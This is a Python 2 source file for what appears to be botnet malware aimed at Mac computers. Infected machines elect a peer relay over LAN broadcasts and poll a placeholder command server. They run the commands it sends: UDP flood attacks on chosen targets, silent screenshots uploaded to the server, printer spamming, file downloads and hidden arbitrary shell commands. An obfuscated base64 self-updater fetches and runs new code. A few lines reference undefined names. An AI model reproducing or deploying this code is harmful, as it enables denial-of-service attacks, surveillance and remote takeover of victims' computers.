import traceback, time, urllib2, urllib, base64, os, threading, random, md5
from socket import *
from random import randint

def b(x):
 return base64.b64decode(x)

if not os.path.isfile("update.py"):
 u="""aW1wb3J0IHVybGxpYixvcyxiYXNlNjQsdGltZQ1kZWYgYih4KToNICAgcmV0dXJuIGJhc2U2NC5iNjRkZWNvZGUoeCkN
      ej11cmxsaWI7DXNlcnZ1cmx1ID0gIltVUERBVEUgVVJMXSINc2VydnVybCAgPSAiW1JFUE9SVCBVUkxdIg13aGlsZSAx
      Og0gICB0cnk6DSAgICAgIGY9ei51cmxvcGVuKHNlcnZ1cmx1KQ0gICAgICBicmVhaw0gICBleGNlcHQgRXhjZXB0aW9u
      Og0gICAgICB0aW1lLnNsZWVwKDUpDSAgICAgIGNvbnRpbnVlDXM9YihmLnJlYWQoKSkucmVwbGFjZSgnXHJcbicsJ1xu
      Jyk7Zm49Im1haW4ucHkiO2M9b3BlbihmbiwicisiKTtJRD1vcGVuKCJJRC50eHQiLCJyIikucmVhZCgpDWlmIGMucmVh
      ZCgpIT1zOmMud3JpdGVsaW5lcyhzKTsNYy5jbG9zZSgpO3A9ei51cmxlbmNvZGUoeydTJzonRScsJ0lEJzpJRH0pDXdo
      aWxlIDE6DSAgIHRyeToNICAgICAgZj16LnVybG9wZW4oc2VydnVybCxwKQ0gICAgICBicmVhaw0gICBleGNlcHQgRXhj
      ZXB0aW9uOg0gICAgICB0aW1lLnNsZWVwKDUpDSAgICAgIGNvbnRpbnVlDW9zLnN5c3RlbSgibm9odXAgcHl0aG9uIG1h
      aW4ucHkgPiAvZGV2L251bGwgJiIpO29zLnN5c3RlbSgicm0gdXBkYXRlLnB5IikN"""
 updateFile = open("update.py", "w")
 updateFile.writelines(b(u))
 updateFile.close()

z                = urllib
T                = time
servurl          = "[SERVER URL]"
host             = ''
port             = 50000
serv             = 0
beat             = 0
noBeat           = 0
serverDelay      = 5
debug            = True
serverStarted    = False
serverStartAlert = False
clientAnnounced  = False
notified         = False

bSocket = socket(AF_INET, SOCK_DGRAM)
bSocket.bind(('', 0))
bSocket.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)

rSocket = socket(AF_INET, SOCK_DGRAM)
rSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
rSocket.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
rSocket.bind((host, port))

s=socket(AF_INET,SOCK_DGRAM)
while 1:
   try:
      s.connect(("x.co",80))
      break
   except Exception:
      time.sleep(5)
      continue
ip=s.getsockname()[0]

def p(o,i):
 global servurl
 global notified
 while 1:
  try:
   d={'S':'E','ID':o} if i==0 else {'IP':o}
   f=z.urlopen(servurl,z.urlencode(d))
   notified=False;
   break
  except Exception:
   if not notified:
   T.sleep(5)
   continue
 return f

def broadcast(mesg):
   if debug: print "Broadcasting";print "Sent:", mesg
   bSocket.sendto(mesg, ('<broadcast>', port))
   time.sleep(2)

def execute(cmd):
   os.system(cmd)
      
class server(threading.Thread):
   def run(self):
      while 1:
         cmd = p(ip,1)
         cmdRead = cmd.read()
         if(len(cmdRead)>0):
            serverSignature = md5.md5(cmdRead+ip).hexdigest()
            if debug: print "Signature", serverSignature
            broadcast(cmdRead+"[IDENT]"+serverSignature)
         else:
            broadcast("AppleServerHeartBeat")
            time.sleep(serverDelay)

class receive(threading.Thread):
   def run(self):
      while 1:
         message, address = rSocket.recvfrom(8192)
         if message=="AppleServerHeartBeat":
            global beat
            beat=beat+1
         elif message=="AnnounceNew":
            global clientAnnounced
            if debug and clientAnnounced:
               print "New client"
               clientAnnounced = True
         else:
            serverSignatureArray = message.split("[IDENT]")
            messageArray = serverSignatureArray[0].split("/n")  
            calculatedSignature  = md5.md5(serverSignatureArray[0]+address[0]).hexdigest()
            if debug: print "Calculated signature", calculatedSignature
            if calculatedSignature == serverSignatureArray[1]: 
               for i in range(0, len(messageArray)-1):
                  hostMessage = messageArray[i]
                  commandRead = hostMessage.split(";")
                  host        = b(commandRead[0])
                  commandID   = commandRead[1]
                  command     = b(commandRead[2])
                  if debug: print host, commandID, command
                  if host == ip:
                     if command == "u":
                        file = open("ID.txt", "w")
                        file.writelines(commandID)
                        file.close()
                        execute("python update.py")
                        sys.exit(1)
                     elif command == "p":
                        dosSocket  = socket(AF_INET,SOCK_DGRAM)
                        dosBytes   = random._urandom(1024)
                        dosTarget  = commandRead[3]
                        dosPort    = commandRead[4]
                        targetTime = time.time()+600
                        while time.time() < targetTime:
                           dosSocket.sendto(dosBytes, (dosTarget,int(dosPort)))
                        dosSocket.close()
                        del dosSocket
                        p(commandID, 0)
                     elif command == "de":
                        serverDelay = commandRead[2]
                        p(commandID,0)
                     elif command == "ss":
                        execute("screencapture -xC screen.png")
                        pictureOpen = open("screen.png", "rb").read()
                        picture = base64.encodestring(pictureOpen)
                        z.urlopen(servurl,z.urlencode({'ID':commandID, 'SS': picture}))
                        execute("rm screen.png")
                     elif command == "pr":
                        printer     = commandRead[3]
                        printCopies = commandRead[4]
                        execute("echo >> empty")
                        for i in range(0, int(printCopies)):
                           execute("lp -d "+printer+" empty")
                           p(commandID,0)
                     elif command == "d":
                        downloadUrl  = commandRead[3]
                        downloadName = commandRead[4]
                        file = z.urlopen(b(url))
                        data = file.read()
                        localFile = open(b(n), "w")
                        localFile.writelines(data)
                        localFile.close()
                     else:
                        isHidden = commandRead[3]
                        if(isHidden): execute("nohup "+command+" > /dev/null &")
                        else: execute(command)
                        p(commandID,0)
                        print commandID
            else:
               if debug: print "False server signature"
               
if debug: print "Announcing"
broadcast("AnnounceNew")

receiveThread=receive()
receiveThread.start()

while 1:
   if beat==0 and not serverStarted:
      if(debug): print "No beat", noBeat
      noBeat = noBeat + 1
      if noBeat==5:
         if(debug): print "Starting as server"
         broadcast("AppleServerHeartBeat")
         serverThread=server()
         serverThread.start()
         noBeat=0
         serverStarted = True;
      elif noBeat==4:
         randSleep = randint(1,10)
         if debug: print "Random sleep integer created:", randSleep
         time.sleep(randSleep)
      else:
         time.sleep(0.5)
   else:
      if debug and not serverStartAlert:
         print "Beat found"
         serverStartAlert = True
      noBeat = beat
      time.sleep(20)
      if noBeat==beat:
         noBeat=0
         beat=0
